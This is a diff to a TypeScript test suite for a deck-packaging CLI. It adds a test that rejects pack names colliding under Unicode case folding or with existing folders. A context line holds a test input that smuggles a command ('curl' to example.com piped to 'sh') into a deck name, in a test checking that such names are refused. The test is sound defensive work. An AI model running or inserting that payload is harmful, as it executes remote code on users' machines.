@@ -271,6 +271,42 @@ describe("dekc ref <file>.tgz", () => {
   );
 
   test.serial(
+    "refuses a pack whose name folds to a pinned one's as APFS folds it, or to a folder on disk",
+    async () => {
+      const other = { ...talk, script: "---\ntitle: Another\n---\n\n## intro\n\nhi\n" };
+      await withTempDir(async (inbox) => {
+        for (const [first, second] of [
+          ["aς", "aσ"],
+          ["ﬁle", "file"],
+        ] as const) {
+          // Files of their own: the inbox is on a file system that may fold the names too.
+          const kept = await packOf(inbox, { ...talk, name: first }, "kept.tgz");
+          const next = await packOf(inbox, { ...other, name: second }, "next.tgz");
+          await withTempProject(receiver, async (root) => {
+            await addRef(root, kept);
+            await expect(addRef(root, next)).rejects.toMatchObject({
+              message: `file/${second} would share its folders with file/${first}, which dek.toml pins`,
+            });
+            expect(Object.keys(loadConfig(join(root, "dek.toml")).refs ?? {})).toEqual([
+              `file/${first}`,
+            ]);
+          });
+        }
+        const pack = await packOf(inbox, talk, "talk.tgz");
+        for (const left of [join("refs", "file", "Talk"), join("packs", "Talk.tgz")]) {
+          await withTempProject(receiver, async (root) => {
+            await mkdir(join(root, left), { recursive: true });
+            await expect(addRef(root, pack)).rejects.toMatchObject({
+              message: `file/talk would share a folder with ${left}, which is already in the project`,
+            });
+            expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
+          });
+        }
+      });
+    },
+  );
+
+  test.serial(
     "refuses a pack whose deck a ref cannot name, without printing the name",
     async () => {
       const name = "x`;curl$IFSexample.com|sh;`";
